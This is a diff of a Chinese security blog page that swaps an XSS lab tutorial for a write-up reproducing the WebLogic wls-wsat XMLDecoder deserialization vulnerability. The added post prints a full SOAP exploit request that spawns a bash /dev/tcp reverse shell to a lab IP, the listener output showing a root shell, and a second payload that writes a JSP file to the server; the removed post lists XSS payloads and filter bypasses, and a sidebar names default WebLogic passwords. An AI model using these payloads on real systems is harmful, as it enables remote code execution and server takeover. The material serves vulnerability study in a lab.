@@ -4,8 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.8.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="XSS, god_13">
-    <meta name="description" content="概述Cross-Site-Scripting简称“CSS”，为了避免与前端叠成样式表的缩写“CSS”冲突，故又称XSS。一般分为反射型，存储型，DOM型。形成XSS的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前">
+    <meta name="keywords" content="weblogic XMLDecoder反序列化漏洞复现, god_13">
+    <meta name="description" content="前言weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传进来的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。影响版本
+10.3.6.0.0
+12.1.3">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -13,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>XSS | god_13</title>
+    <title>weblogic XMLDecoder反序列化漏洞复现 | god_13</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -257,13 +259,13 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/6.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        XSS
+                        weblogic XMLDecoder反序列化漏洞复现
                     </div>
                 </div>
             </div>
@@ -374,8 +376,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/漏洞/" target="_blank">
-                                <span class="chip bg-color">漏洞</span>
+                            <a href="/tags/漏洞复现/" target="_blank">
+                                <span class="chip bg-color">漏洞复现</span>
                             </a>
                         
                     </div>
@@ -389,21 +391,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2019-06-04
+                    2019-07-26
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        717
+                        1.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        2 Min
+                        5 Min
                     </div>
                     
                 
@@ -419,17 +421,91 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Cross-Site-Scripting简称“CSS”，为了避免与前端叠成样式表的缩写“CSS”冲突，故又称XSS。一般分为反射型，存储型，DOM型。形成XSS的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被当作代码解析从而产生危害。</p>
-<h2 id="反射型XSS（get）"><a href="#反射型XSS（get）" class="headerlink" title="反射型XSS（get）"></a>反射型XSS（get）</h2><p><img src="/2019/06/04/xss/1.PNG" alt=""><br>这是get类型的XSS，只需要输入<br><code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code><br>即可，但是此处限制了输入长度，我们可以在url里输入，来摆脱长度限制<br><img src="/2019/06/04/xss/2.PNG" alt=""><br>结果成功弹窗<br><img src="/2019/06/04/xss/3.PNG" alt=""></p>
-<h2 id="反射型XSS（post）"><a href="#反射型XSS（post）" class="headerlink" title="反射型XSS（post）"></a>反射型XSS（post）</h2><p>直接post xss语句就行<br><img src="/2019/06/04/xss/4.PNG" alt=""><br>结果成功弹窗<br><img src="/2019/06/04/xss/5.PNG" alt=""></p>
-<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS主要指指XSS语句存储在服务器上，如个人信息或发表文章等地方，当用户访问该页面的时候，会触发代码执行，例如此处是一个留言框<br><img src="/2019/06/04/xss/6.PNG" alt=""><br>我们在留言框里输入XSS语句，就相当于病毒存储在服务器上，当有人访问，就会被触发，从而造成危害<br><img src="/2019/06/04/xss/7.PNG" alt=""></p>
-<h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>DOM型XSS其实是一种特殊的反射型XSS，它是基于DOM文档对象模型的一种漏洞，常见的dom型漏洞是由img标签形成的<br><code>&lt;img src=1 onerror=alert(1)&gt;</code><br>这就是一条最简单的dom型XSS语句<br>源码如下<br><img src="/2019/06/04/xss/8.PNG" alt=""><br>根据源码，我们可以构造payload(字符类型的记得要加引号)<br><code>&#39;&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</code><br><img src="/2019/06/04/xss/9.PNG" alt=""><br>也可以弹窗<br><img src="/2019/06/04/xss/10.PNG" alt=""></p>
-<h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>这个XSS类型和上面的差别是，第一种xss是会直接反射，就是会直接弹窗，这一种还需要点击才会触发xss<br><img src="/2019/06/04/xss/11.PNG" alt=""><br>点击链接<br><img src="/2019/06/04/xss/12.PNG" alt=""><br>显示出结果<br><img src="/2019/06/04/xss/13.PNG" alt=""></p>
-<h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>一些网站会对XSS作出一定的防护，例如对script的过滤<br><img src="/2019/06/04/xss/15.PNG" alt=""><br>这种情况下也可以用dom型的payload来绕过<br><code>&#39;&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;)&gt;</code></p>
-<h2 id="xss之htmlspecialchars"><a href="#xss之htmlspecialchars" class="headerlink" title="xss之htmlspecialchars"></a>xss之htmlspecialchars</h2><p><img src="/2019/06/04/xss/16.PNG" alt=""><br>htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。<br>使用了htmlspecialchars进行处理,是不是就没问题了呢,htmlspecialchars默认不对’处理<br>构造payload<br><code>&#39; onclick=&#39;alert(111)&#39;</code><br>同样可以弹窗</p>
-<h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p><img src="/2019/06/04/xss/17.PNG" alt=""><br>这种类型的xss你上传的内容都会储存在a标签的href属性里面，可以里利用javascript协议来执行js，从而绕过，构造payload<br><code>javascript:alert(&quot;XSS之href输出&quot;)</code><br>从而弹窗</p>
-<h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>这种类型的xss和href类型的有什么区别呢？最大的区别就是虽然都存储到了前端，但是位置不同，比如，我们传入参数“111”，会发现参数存储到了这里<img src="/2019/06/04/xss/18.PNG" alt=""><br>只要我们构造出来xss语句，先让上一个script标签闭合，然后构造xss语句即可，payload如下<br><code>a&#39; &lt;/script&gt;&lt;script&gt;alert(111)&lt;/script&gt;</code><br>就可以触发xss了</p>
-<p>未完待续~~</p>
+                <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传进来的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。<br>影响版本</p>
+<pre><code>10.3.6.0.0
+12.1.3.0.0
+12.2.1.1.0
+12.2.1.2.0
+</code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>此漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求在weblogic.wsee.jaxws.workcontext.WorkContextServerTube类中获取XML数据最终传递给XMLDecoder来解析，其解析XML的调用栈为</p>
+<pre><code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest
+weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld
+weblogic.wsee.workarea.WorkContextXmlInputAdapter
+</code></pre><p>归根结底，还是weblogic犯了编码上的错误，完全信任用户的输入，然后调用XMLDecoder进行反序列,导致了这个漏洞的发生。</p>
+<h2 id="反弹shell的一些介绍"><a href="#反弹shell的一些介绍" class="headerlink" title="反弹shell的一些介绍"></a>反弹shell的一些介绍</h2><pre><code>一条反弹shell：
+bash -i &gt;&amp; /dev/tcp/192.168.75.131/8888 0&gt;&amp;1
+bash -i表示在本地打开一个bash
+/dev/tcp/是Linux中的一个特殊设备,打开这个文件就相当于发出了一个socket调用，建立一个socket连接
+&gt;&amp;后面跟上/dev/tcp/ip/port这个文件代表将标准输出和标准错误输出重定向到这个文件，也就是传递到远程上，如果远程开启了对应的端口去监听，就会接收到这个bash的标准输出和标准错误输出
+0&gt;&amp;1代表将标准输入重定向到标准输出
+</code></pre><pre><code>0 - stdin 代表标准输入，使用&lt;或&lt;&lt;
+1 - stdout 代表标准输出，使用&gt;或&gt;&gt;
+2 - stdeer 代表标准错误输出，使用2&gt;或2&gt;&gt;
+</code></pre><p>还有&gt;&amp;这个符号的含义，最好的理解时这样的</p>
+<pre><code>当&gt;&amp;后面接文件时，表示将标准输出和标准错误输出重定向到文件
+当&gt;&amp;后面接文件描述符时，表示将前面的文件描述符重定向到后面的文件描述符
+</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>在burp发送如下数据包，要添加的除了下面的内容，还有Content-Type: text/xml<br>我们添加的post的内容是webservices调用服务器端的数据时要用到的，是用java写的，里面有反弹语句</p>
+<pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1
+Host: 192.168.75.131:7001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Connection: close
+Cookie: JSESSIONID=5fwbd6hTQh2kC3xfcYjm0p1rGMwXxBftYcy2pqD1y6hLTD2hq7BQ!915002489; ADMINCONSOLESESSION=ZNlTd6jKfcTSvR5zkn1T1TMDfp4fXMWWLvttnhq2XLTNQLy14TGP!-1609868016
+Upgrade-Insecure-Requests: 1
+Content-Type: text/xml
+
+&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;
+&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;
+&lt;void index=&quot;0&quot;&gt;
+&lt;string&gt;/bin/bash&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index=&quot;1&quot;&gt;
+&lt;string&gt;-c&lt;/string&gt;
+&lt;/void&gt;
+&lt;void index=&quot;2&quot;&gt;
+&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.75.131/8888 0&amp;gt;&amp;amp;1&lt;/string&gt;
+&lt;/void&gt;
+&lt;/array&gt;
+&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;
+&lt;/java&gt;
+&lt;/work:WorkContext&gt;
+&lt;/soapenv:Header&gt;
+&lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre><p>发送到repeater里去，然后go，返回500，说明成功post<br>也能成功反弹shell</p>
+<pre><code>dvsx@ubuntu:~$ nc -lvp 8888
+Listening on [0.0.0.0] (family 0, port 8888)
+Connection from 172.19.0.2 59154 received!
+bash: cannot set terminal process group (1): Inappropriate ioctl for device
+bash: no job control in this shell
+root@964c89dcfe79:~/Oracle/Middleware/user_projects/domains/base_domain# whoami
+&lt;Middleware/user_projects/domains/base_domain# whoami                        
+root
+root@964c89dcfe79:~/Oracle/Middleware/user_projects/domains/base_domain# 
+</code></pre><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>同样的，post</p>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+    &lt;soapenv:Header&gt;
+    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+    &lt;java&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;
+    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; 
+    &lt;string&gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/ptest.js&lt;/string&gt;
+    &lt;void method=&quot;println&quot;&gt;&lt;string&gt;
+    &lt;![CDATA[
+&lt;% out.print(&quot;test&quot;); %&gt;
+    ]]&gt;
+    &lt;/string&gt;
+    &lt;/void&gt;
+    &lt;void method=&quot;close&quot;/&gt;
+    &lt;/object&gt;&lt;/java&gt;&lt;/java&gt;
+    &lt;/work:WorkContext&gt;
+    &lt;/soapenv:Header&gt;
+    &lt;soapenv:Body/&gt;
+&lt;/soapenv:Envelope&gt;
+</code></pre><p>然后访问<a href="http://your-ip:7001/bea_wls_internal/test.jsp" target="_blank" rel="noopener">http://your-ip:7001/bea_wls_internal/test.jsp</a><br><img src="/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/1.PNG" alt=""></p>
+<p>参考文章<br><a href="https://www.anquanke.com/post/id/92003" target="_blank" rel="noopener">https://www.anquanke.com/post/id/92003</a></p>
 
             </div>
             <hr>
@@ -585,9 +661,9 @@
             </div>
             <br>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text" property="dct:title" rel="dct:type">
-                    《XSS》
+                    《weblogic XMLDecoder反序列化漏洞复现》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/06/04/xss/" property="cc:attributionName" rel="cc:attributionURL">
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/" property="cc:attributionName" rel="cc:attributionURL">
                 xiao
             </a> is licensed under a
             <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">
@@ -650,28 +726,30 @@
         
         <div class="article col s12 m6 overflow-policy" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="fa fa-dot-circle-o"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2019/06/10/csrf/">
+                <a href="/2019/07/26/weblogic-xmldecoder-fan-xu-lie-hua-lou-dong-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="CSRF">
+                        <img src="/medias/featureimages/6.jpg" class="responsive-img" alt="weblogic XMLDecoder反序列化漏洞复现">
                         
-                        <span class="card-title">CSRF</span>
+                        <span class="card-title">weblogic XMLDecoder反序列化漏洞复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            概述CSRF是跨站请求伪造攻击的简称，在CSRF的攻击场景中攻击者会伪造一个请求（一般是一个链接），然后哦欺骗用户进行点击，用户一旦点击这个链接，整个攻击就完成了。所以CSRF也叫“one click”攻击。
-CSRF(GET)get方式的
+                            前言weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传进来的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。影响版本
+10.3.6.0.0
+12.1.3
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-10
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -680,11 +758,12 @@ CSRF(GET)get方式的
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
@@ -698,25 +777,30 @@ CSRF(GET)get方式的
                 Next&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/06/03/yan-zheng-ma-rao-guo-xiao-ji-qiao/">
+                <a href="/2019/07/25/weblogic-weak-password-fu-xian/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="验证码绕过小技巧">
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="weblogic weak_password复现">
                         
-                        <span class="card-title">验证码绕过小技巧</span>
+                        <span class="card-title">weblogic weak_password复现</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            在日常的CTF题目和渗透测试里，很容易遇到登陆的问题，如果没有验证码的情况下，可以直接爆破，但是如果有验证码，就很难操作了，下面就讲述一下验证码绕过小技巧。
-验证码不刷新（服务器端）原理为什么会产生验证码不刷新的情况呢？原因就是你第一次输入
+                            环境基于vulhub的weblogic弱口令漏洞和任意文件读取漏洞
+弱口令本环境存在弱口令
+用户名：weblogic
+密码：Oracle@123
+weblogic常见的弱口令组合
+1.  Oracle - WebLogic
+Method  
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-06-03
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-07-25
                             </span>
                         <span class="publish-author">
                             
@@ -729,8 +813,8 @@ CSRF(GET)get方式的
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/漏洞/" target="_blank">
-                        <span class="chip bg-color">漏洞</span>
+                    <a href="/tags/漏洞复现/" target="_blank">
+                        <span class="chip bg-color">漏洞复现</span>
                     </a>
                     
                 </div>
